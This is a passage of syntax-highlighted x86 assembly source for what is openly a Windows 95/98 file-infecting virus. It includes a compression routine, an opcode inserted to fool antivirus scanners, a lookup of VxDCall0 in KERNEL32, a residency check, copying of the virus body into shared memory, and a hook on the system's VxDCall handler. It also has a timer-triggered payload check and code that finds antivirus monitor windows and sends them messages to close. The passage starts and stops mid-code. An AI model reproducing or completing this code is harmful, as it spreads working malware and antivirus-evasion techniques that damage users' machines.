    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cb1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;compare with next group</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">cb2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;store bit 0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_bit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;store bit 1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_bit</span><span class="sc0">
</span><span class="sc5">cb0</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;store bit 1</span><span class="sc0">
</span><span class="sc5">end_cb1</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_bit</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">next_bits</span><span class="sc0">              </span><span class="sc1">;next bit</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">next_byte</span><span class="sc0">              </span><span class="sc1">;next byte</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;save new size</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all regs</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;test for negative compression</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">c_ok</span><span class="sc0">                 </span><span class="sc1">;positive compression</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">                 </span><span class="sc1">;clear flag</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">c_ok</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">clc</span><span class="sc0">                 </span><span class="sc1">;negative compression, set flag</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">cb1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;store bit 0</span><span class="sc0">
</span><span class="sc5">end_cb2</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_bit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;store bit 0</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_cb1</span><span class="sc0">
</span><span class="sc5">cb2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;store bit 0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_bit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;store bit 1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_cb2</span><span class="sc0">
</span><span class="sc5">copy_bit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                </span><span class="sc1">;get byte from EBP</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;make space for next bit</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;set bit</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cbit</span><span class="sc0">
</span><span class="sc5">BCE32_Compress</span><span class="sc0">  </span><span class="sc9">EndP</span><span class="sc0">                </span><span class="sc1">;end of compression procedure</span><span class="sc0">


</span><span class="sc5">compressed</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;compressed body starts here</span><span class="sc0">
        </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">quit_payload</span><span class="sc4">&gt;</span><span class="sc0">      </span><span class="sc1">;setup SEH frame</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d6h</span><span class="sc0">                            </span><span class="sc1">;undoc. opcode SALC</span><span class="sc0">
                                                </span><span class="sc1">;used only to fool AVs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc0">                             </span><span class="sc1">;calculate delta offset</span><span class="sc0">
</span><span class="sc5">gdelta</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bff70000h</span><span class="sc0">                     </span><span class="sc1">;base address of K32 (95/98)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;get ptr to PE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;make it raw ptr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;get virtual address of ET</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_AddressOfFunctions</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;get start address of exported</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;functions</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                            </span><span class="sc1">;EDX=0</span><span class="sc0">
</span><span class="sc5">l_addr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ED_NumberOfFunctions</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;end of functions addresses?</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc0">                            </span><span class="sc1">;yeah, jump to host</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                                  
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;ECX=7</span><span class="sc0">
</span><span class="sc5">l_func</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                 </span><span class="sc1">;EDX++</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">;load dword</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;addresses equal?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">l_addr</span><span class="sc0">                              </span><span class="sc1">;no, next function</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l_func</span><span class="sc0">                             </span><span class="sc1">;yeah, next check</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;make it raw ptr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;and save address of VxDCall0</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;EAX &lt;=&gt; ESI</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;residency check</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2ah</span><span class="sc0">                             </span><span class="sc1">;get system time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'!BG!'</span><span class="sc0">                         </span><span class="sc1">;our sign</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                             </span><span class="sc1">;call int21h dispatcher</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1982</span><span class="sc0">                           </span><span class="sc1">;already resident?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc0">                             </span><span class="sc1">;yeah, jump to host</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_USER</span><span class="sc0">            </span><span class="sc1">;now we will reserve memory</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">mem_size</span><span class="sc0">                           </span><span class="sc1">;for our virus body in shared</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PR_SHARED</span><span class="sc0">                          </span><span class="sc1">;area of virtual memory, so it</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010000h</span><span class="sc0">                          </span><span class="sc1">;will be visible for all</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;processes</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;error ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc0">                             </span><span class="sc1">;yeah, jump to host</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;no, continue</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;save address to EBX register</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">                      </span><span class="sc1">;is it in shared area ?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">pg_free</span><span class="sc0">                              </span><span class="sc1">;no, free pages and quit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mem_addr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;save address</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_USER</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_PRESENT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_FIXED</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;now we will commit</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PD_ZEROINIT</span><span class="sc0">                        </span><span class="sc1">;physical space for our</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">mem_size</span><span class="sc0">                           </span><span class="sc1">;reserved pages.</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010001h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                           </span><span class="sc1">;error ?</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">pg_free</span><span class="sc0">                           </span><span class="sc1">;yeah, free pages and quit</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;save address</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">compressed</span><span class="sc4">-</span><span class="sc5">VxDCall_addr</span><span class="sc4">-(</span><span class="sc5">decompressed</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">jump_loc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">      </span><span class="sc1">;store handler location</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                           </span><span class="sc1">;now we will search for</span><span class="sc0">
</span><span class="sc5">vxdloop</span><span class="sc4">:</span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;call instruction</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2eh</span><span class="sc0">                             </span><span class="sc1">;is it "CS:" selector override?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">vxdnext</span><span class="sc0">                             </span><span class="sc1">;no, next byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1dffh</span><span class="sc0">               </span><span class="sc1">;and is it our instruction?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">got_ptr</span><span class="sc0">                              </span><span class="sc1">;yeah, we got ptr to memory</span><span class="sc0">
</span><span class="sc5">vxdnext</span><span class="sc4">:</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">vxdloop</span><span class="sc0">                            </span><span class="sc1">;no, next try</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;EBX=address our pages</span><span class="sc0">
</span><span class="sc5">pg_free</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;shit, address not found,</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;we have to free pages</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0001000ah</span><span class="sc0">                          </span><span class="sc1">;and jump to host</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VxDCall0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;free pages call</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_host</span><span class="sc0">                            </span><span class="sc1">;(((</span><span class="sc0">

</span><span class="sc5">got_ptr</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;get address of our pages</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;save all registers</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">compressed</span><span class="sc4">-</span><span class="sc5">gdelta</span><span class="sc4">-(</span><span class="sc5">decompressed</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">virtual_end</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">;copy virus to shared memory</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">                               </span><span class="sc1">;...</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                                   </span><span class="sc1">;restore all registers</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">                                     </span><span class="sc1">;exclusive execution</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">;skip instruction</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">;load address from instruction</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;store it</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;ESI=address</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;EDI=original address of address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;ECX=6</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">;save original 48bit address</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                 </span><span class="sc1">;restore address</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;get ptr to shared memory</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">compressed</span><span class="sc4">-</span><span class="sc5">VxDCall_hook</span><span class="sc4">-(</span><span class="sc5">decompressed</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;store address of our handler</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                             </span><span class="sc1">;+selector</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                                   </span><span class="sc1">;store selector</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                                     </span><span class="sc1">;nonexclusive execution...</span><span class="sc0">

</span><span class="sc5">end_host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                              </span><span class="sc1">;is it rite time to activate</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22</span><span class="sc0">                              </span><span class="sc1">;our payload?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">do_payload</span><span class="sc0">                           </span><span class="sc1">;yeah</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ShItTyMoNs</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;no, but lets kill some</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                            </span><span class="sc1">;AV monitors</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;2 monitors</span><span class="sc0">
</span><span class="sc5">KiLlMoNs</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FndWndA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;find window</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;found?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">next_mon</span><span class="sc0">                             </span><span class="sc1">;no, try to kill other monitor</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;now we will send message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;to AV window to kill itself</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                                </span><span class="sc1">;veeeeeeery stupid X-DD</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PstMsgA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;bye bye, hahaha</span><span class="sc0">
</span><span class="sc5">next_mon</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc0">                            </span><span class="sc1">;next monitor string</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
